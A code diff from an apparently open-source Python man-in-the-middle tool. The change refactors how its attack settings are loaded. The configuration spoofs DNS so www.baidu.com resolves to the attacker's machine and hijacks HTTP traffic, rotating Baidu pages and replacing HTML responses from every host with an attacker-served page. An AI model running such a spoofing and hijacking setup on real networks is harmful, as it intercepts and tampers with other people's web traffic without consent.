@@ -5,6 +5,7 @@
 # @Link    : https://github.com/sintrb/PyMITM/
 # @Version : 1.0
 
+import time
 import threading
 from util import getselfip
 from PyMITMBase import DNSSpoofingServer, HttpHijackServer
@@ -51,81 +52,7 @@ def response_mypage(proxyhandler, req, res):
 	if 'Content-Encoding' in res.headers:
 		del res.headers['Content-Encoding']
 
-
-setting = {
-	'dnsspoofing':{	# dns spoofing config
-		'listen':{	# listen on *:53, 53 is default dns port
-			'host':'0.0.0.0',
-			'port':53,
-		},
-		'logging':{
-			'file':'dns.log',
-			'console':True,
-		},
-		'resolvs':(
-			('.*',	# spoof all dns query, if you want spoof only 172.16.0.100-172.16.0.109 's query you can use '172.16.0.10[0-9]'
-				(
-					('www.baidu.com', getselfip()),	# only spoof 'www.baidu.com' to this computer, other hostname resolv to real ip address
-				)
-			),
-		)
-	},
-
-
-	'httphijack':{	# http hijack config
-		'listen':{	# listen on *:80, http default port
-			'host':'0.0.0.0',
-			'port':80,
-		},
-		'logging':{
-			'file':'http.log',
-			'console':False,
-		},
-		'hijacks':(
-
-			# rule 1
-			{
-				'host':'www.baidu.com',	# when host is www.baidu.com
-				# 'path':'.*',	# all path
-				# 'method':'.*',	# all method, GET POST PUT ...
-				# 'ip':'172.16.0.10[0-9]',	# hijack 172.16.0.100-172.16.0.109 's session
-				'request':{	# before request to http server
-					# 'headers':{	# and
-					# },
-					'handler': clear_cache,
-				},
-				'response':{	# after response from http server
-					# 'code':'200',	# status code
-					'headers':{ # and
-						'Content-Type':'.*html.*'	# only html response will be hijacked
-					},
-					'handler':rotate_html,	# rotate 90 deg
-				},
-			},
-
-			# rule 2
-			{
-				'host':'.*',	# all host
-				'path':'.*',	
-				'method':'.*',
-				'ip':'.*',
-				'response':{
-					'headers':{ # and
-						'Content-Type':'.*html.*'	# only hijack html type response
-					},
-					'handler': response_mypage,	# response a hijacked page
-				},
-			},
-		)
-	}
-}
-
-
-
-
-
-if __name__ == '__main__':
-	import time
+def start_with_setting(setting):
 	if type(setting['dnsspoofing']) == type({}):
 		cfg = setting['dnsspoofing']
 		t = threading.Thread(target=run_server, args=(DNSSpoofingServer, cfg))
@@ -149,4 +76,77 @@ if __name__ == '__main__':
 			time.sleep(0.5)
 	while True:
 		time.sleep(1)
+
+
+
+if __name__ == '__main__':
+	setting = {
+		'dnsspoofing':{	# dns spoofing config
+			'listen':{	# listen on *:53, 53 is default dns port
+				'host':'0.0.0.0',
+				'port':53,
+			},
+			'logging':{
+				'file':'dns.log',
+				'console':True,
+			},
+			'resolvs':(
+				('.*',	# spoof all dns query, if you want spoof only 172.16.0.100-172.16.0.109 's query you can use '172.16.0.10[0-9]'
+					(
+						('www.baidu.com', getselfip()),	# only spoof 'www.baidu.com' to this computer, other hostname resolv to real ip address
+					)
+				),
+			)
+		},
+
+
+		'httphijack':{	# http hijack config
+			'listen':{	# listen on *:80, http default port
+				'host':'0.0.0.0',
+				'port':80,
+			},
+			'logging':{
+				'file':'http.log',
+				'console':False,
+			},
+			'hijacks':(
+
+				# rule 1
+				{
+					'host':'www.baidu.com',	# when host is www.baidu.com
+					# 'path':'.*',	# all path
+					# 'method':'.*',	# all method, GET POST PUT ...
+					# 'ip':'172.16.0.10[0-9]',	# hijack 172.16.0.100-172.16.0.109 's session
+					'request':{	# before request to http server
+						# 'headers':{	# and
+						# },
+						'handler': clear_cache,
+					},
+					'response':{	# after response from http server
+						# 'code':'200',	# status code
+						'headers':{ # and
+							'Content-Type':'.*html.*'	# only html response will be hijacked
+						},
+						'handler':rotate_html,	# rotate 90 deg
+					},
+				},
+
+				# rule 2
+				{
+					'host':'.*',	# all host
+					'path':'.*',	
+					'method':'.*',
+					'ip':'.*',
+					'response':{
+						'headers':{ # and
+							'Content-Type':'.*html.*'	# only hijack html type response
+						},
+						'handler': response_mypage,	# response a hijacked page
+					},
+				},
+			)
+		}
+	}
+
+	start_with_setting(setting)
 
